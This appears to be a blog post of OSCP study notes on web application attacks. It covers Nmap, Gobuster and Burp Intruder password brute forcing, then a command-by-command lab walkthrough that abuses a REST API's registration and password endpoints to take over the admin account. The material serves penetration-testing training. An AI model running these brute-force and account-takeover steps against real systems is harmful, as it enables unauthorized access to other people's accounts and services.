---
title: Intro to Web App Attacks
date: 2024-01-15 08:35:00 -0600
categories: [OSCP]
tags: [oscp, pen200, offsec, certs]     # TAG names should always be lowercase
---
*The Web App Attack tools and tactics reviewed here are presented specifically in preparation for the OSCP exam per course suggestions and are by no means replacements for the OSCP training course, nor comprehensive guides for this step in the Kill Chain.*

# Intro to Web App Attacks

With the knowledge of common web app vulnerabilities, such as what we can learn from [OWASP Top 10](https://owasp.org/www-project-top-ten/), we will leverage Nmap, Wappalyzer, Gobuster, and Burp Suite to conduct testing.

## Web Application Assessment Tools

### Fingerprinting Web Servers with Nmap
```console
$ sudo nmap -p80 -sV 111.111.111.111
$ sudo nmap -p80 --script=http-enum 111.111.111.111    // script performs initial fingerprinting of webserver
```

### Tech Stack Identification with Wappalyzer
[Create a free account.](https://www.wappalyzer.com)

Perform a Technology Lookup on your target domain.

Results show details about the technology stack supporting the web server, including JavaScript libraries, many of which are vulnerable.

### Directory Brute Force with Gobuster
Gobuster enumerates publically-accessible files and directories using wordlists.

```console
$ gobuster dir -u 111.111.111.111 -w /usr/share/wordlists/dirb/common.txt -t 5
```

### Burp Suite
```console
$ burpsuite
```
#### Proxy Tool
Intercept requests from the browser before they are passed to the server.

Burp's default proxy listener is on port 8080, so set up both the Burp Proxy > Options and your internet browser's Network Proxy Settings to localhost:8080.

The Proxy > HTTP History shows requests and responses. 

In Proxy > HTTP History, select an entry, right click, and Send to Repeater. This allows you to modify requests in History and resend them.

#### Intruder
Intruder automates various attacks.

We need to configure our local Kali's hosts file to statically assign the IP to the target website.
```console
$ sudo nano /etc/hosts

// add line for target

$ cat etc/hosts
...
111.111.111.111 targetsite
```
Example Brute Force attack:


Navigate to a login page and enter any username and password, like "admin" and "test". Submit.

In Proxy > HTTP History, right click the POST to the login page and Send to Intruder.

In the Intruder tab, select the POST to modify and move to the Positions sub-tab.

Press Clear on the right hand side to remove all fields.

Select the password key value and press "Add".

In the Payloads tab, paste your chosen word list in the Payload Opetions [Simple list] section.

Click "Start Attack".

In the Results tab, look for requests that have different Status codes or Lengths.

## Web Application Enumeration

Firefox's Debugger tool in the Web Developer menu shows page resources and content, like JavaScript frameworks, hidden input fields, software versions, and client-side controls.

Right clicking on a field and navigating to the Inspect tool, we can see the related HTML, often showing us hidden form fields to test.

### Inspecting HTTP Response Headers and Sitemaps

We can use Burp or the browser's Network tool.

Sitemaps help search engine bots crawl website and instruct bots which directories/files not to crawl.

```console
$ curl https://www.google.com/robots.txt
```

### Enumerating and Abusing APIs

REST - Representational State Transfer - APIs are used for many purposes, including authentication.

Gobuster can be used to brute force API endpoints.

API paths typically look like /api_name/version_number

```console
$ nano pattern

{GOBUSTER}/v1
{GOBUSTER}/v2

$ gobuster dir -u http://111.111.111.111:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern

/users/v1

$ curl -i http://111.111.111.111:5002/users/v1

    {
      "email": "admin@mail.com",
      "username": "admin"
    }

$ gobuster dir -u http://111.111.111.111:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt

/password

$ curl -i http://111.111.111.111:5002/users/v1/admin/password

HTTP/1.0 405 METHOD NOT ALLOWED

// curl's default is GET - let's try POST or PUT
// but first, let's see if /login exists.

$ curl -i http://111.111.111.111:5002/users/v1/login
{ "status": "fail", "message": "User not found"}

// login exists! how do we interact with it?
// let' stry POST or PUT

$ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://111.111.111.111:5002/users/v1/login
{ "status": "fail", "message": "Password is not correct for the given username."}

// now we know the API parameters are correctly formed
// if we don't know the password, let's try to create a new user

$ curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://111.111.111.111:5002/users/v1/register
{ "status": "fail", "message": "'email' is a required property"}

$ curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://111.111.111.111:5002/users/v1/register

// maybe there's an administrative key we can abuse?

$ curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://111.111.111.111:5002/users/v1/register
{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}

// log in

$ curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://111.111.111.111:5002/users/v1/login
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew", "message": "Successfully logged in.", "status": "success"}

// use this token to change the admin user's password

$ curl  \
  'http://111.111.111.111:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'


{
  "detail": "The method is not allowed for the requested URL.",
  "status": 405,
  "title": "Method Not Allowed",
  "type": "about:blank"
}

// let's try PUT

$ curl -X 'PUT' \
  'http://111.111.111.111:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'

// no error message received above? you successfully changed the admin password!
// now, try to login as the admin user

$ curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzIxMjgsImlhdCI6MTY0OTI3MTgyOCwic3ViIjoiYWRtaW4ifQ.yNgxeIUH0XLElK95TCU88lQSLP6lCl7usZYoZDlUlo0", "message": "Successfully logged in.", "status": "success"}

// admin account pwned!

```

We can recreate all of the above steps in Burp:

Replicate the last admin login attempt and sent to the proxy appending the --proxy 127.0.0.1:8080 to the command.

```console
curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login --proxy 127.0.0.1:8080
```

Navigate to Burp's Repeater tab. Here, create a new empty request and fill it with the same data as we used in the above command. You should see the same behavior, and now you can test more APIs, faster.

After you've tested all interesting APIs, go to the Target tab and observe the Site map. From here, you can forward saved requests to Repeater or Intruder to test further.



